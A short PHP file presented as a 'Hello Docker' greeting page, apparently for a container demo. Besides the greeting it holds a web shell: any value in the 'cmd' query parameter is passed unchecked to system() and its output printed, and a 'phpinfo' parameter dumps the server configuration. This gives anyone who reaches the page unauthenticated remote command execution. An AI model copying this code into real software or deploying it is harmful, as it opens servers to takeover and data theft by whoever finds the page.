<?php

echo "<p>Hello Docker !</p>";

if (isset($_GET["cmd"]))
{
    echo "<pre>" . system($_GET["cmd"]) . "</pre>";
}


if (isset($_GET["phpinfo"]))
{
    phpinfo();
}


?>